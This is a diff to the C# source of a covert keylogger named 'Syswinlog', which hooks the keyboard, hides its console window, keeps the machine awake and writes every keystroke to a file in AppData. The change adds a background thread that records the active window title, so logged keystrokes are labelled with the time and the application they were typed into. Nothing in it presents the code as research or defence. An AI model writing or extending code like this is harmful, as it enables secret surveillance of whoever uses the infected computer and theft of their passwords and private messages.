@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.Timers;
 using System.Windows.Forms;
 using System.IO;
+using System.Threading;
 using Syswinlog.Classes.NativeMethods;
 using Syswinlog.Classes.Constants;
 using Syswinlog.Classes.Startup;
@@ -32,11 +33,35 @@ namespace Syswinlog
             StatusLog.Log("Started...");
             Utils.PreventSleep();
 
+            _activeWindowTextManager = new ActiveWindowTextManager();
+            _activeWindowTextManager.Run();
+
             _hookptr = SetHook(KeyBoardProcCallback);
             SetConsoleWindow(Constants.ConsoleWindowState.SW_HIDE);
 
             Application.Run();
             NativeMethods.UnhookWindowsHookEx(_hookptr);
+        }
+
+        class ActiveWindowTextManager
+        {
+            private static StringBuilder _activeWindow = new StringBuilder();
+            public void Run()
+            {
+                new Thread(() => {
+                    while( true ) {
+                        _activeWindow = Utils.GetActiveWindowTitle();
+                        Thread.Sleep(200);
+                    }
+                }).Start();
+            }
+
+            public StringBuilder activeWindow
+            {
+                get {
+                    return _activeWindow;
+                }
+            }
         }
 
         public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
@@ -79,8 +104,14 @@ namespace Syswinlog
                 uppercase = !uppercase;
             }
 
-             StringBuilder _internal = new StringBuilder();
-            if( isPrintable ) {
+            StringBuilder _internal = new StringBuilder();
+            OnActiveWindowChange(delegate () {
+                _internal.Append(
+                    $"\n\r[{DateTime.Now.ToShortTimeString()}] [{_activeWindowTextManager.activeWindow}]\n=====\n"
+                );
+            });
+
+            if ( isPrintable ) {
                 key = (uppercase) ? ApplyKeyShiftModifier(key) : key;
                 _internal.Append(key);
             } else {
@@ -90,6 +121,14 @@ namespace Syswinlog
             using (_outfile = new StreamWriter(
                 Utils.GetAppDataFolder() + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                 _outfile.Write(_internal);
+            }
+        }
+
+        public static void OnActiveWindowChange(ActiveWindowCallback callback)
+        {
+            if (!_currentActiveWindow.Equals(_activeWindowTextManager.activeWindow)) {
+                _currentActiveWindow  = _activeWindowTextManager.activeWindow;
+                callback();
             }
         }
 
@@ -105,8 +144,11 @@ namespace Syswinlog
         private static IntPtr _hookptr = IntPtr.Zero;
         private static bool uppercase;
         private static StreamWriter _outfile;
+        private static StringBuilder _currentActiveWindow = new StringBuilder();
         // information about the current host
         private static HostInfo hostInfo;
+        private static ActiveWindowTextManager _activeWindowTextManager;
+        public delegate void ActiveWindowCallback();
         #endregion
     }
 }
